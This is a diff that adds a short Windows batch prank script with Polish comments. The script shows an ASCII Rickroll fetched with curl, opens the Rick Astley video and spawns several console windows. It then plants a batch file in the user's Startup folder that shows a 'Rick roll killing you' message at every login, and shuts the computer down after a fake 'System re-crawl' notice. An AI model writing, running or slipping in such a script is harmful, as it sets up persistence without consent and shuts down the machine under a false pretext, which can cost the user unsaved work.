@@ -1,0 +1,18 @@
+@echo off
+start cmd /c "curl ascii.live/rick"
+timeout /t 9 >nul
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+timeout /t 8 >nul
+
+for /L %%i in (1,1,5) do (
+    start cmd /c "echo Never gonna give you up! && timeout /t 1 >nul"
+)
+
+echo Initiating system re-crawl...
+timeout /t 7 >nul
+
+:: Stwórz plik w autostarcie, który uruchomi re-crawl message po restarcie
+echo msg * Rick roll killing you. > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\recrawl.bat"
+
+:: Wyłączenie komputera (shutdown)
+shutdown /s /t 5 /c "System re-crawl in progress..."
